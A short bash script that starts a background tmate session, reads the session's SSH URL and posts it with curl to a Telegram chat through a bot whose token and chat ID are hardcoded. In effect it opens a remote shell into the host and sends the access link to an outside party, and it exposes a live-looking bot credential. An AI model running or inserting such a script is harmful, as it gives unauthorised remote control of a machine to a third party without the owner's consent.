#!/bin/bash

BOT_TOKEN="6101714973:AAFK-tM9WgRTBPpNT3kRyjiUeMfw295xtD4"
CHAT_ID="-1001957188901"

tmate_output=$(nohup tmate -S /tmp/tmate.sock new-session -d </dev/null >/dev/null 2>&1 &)
tmate -S /tmp/tmate.sock wait tmate-ready

sleep 5

ssh_url=$(tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
     -d "chat_id=$CHAT_ID" \
     -d "text=tmate SSH URL: $ssh_url"
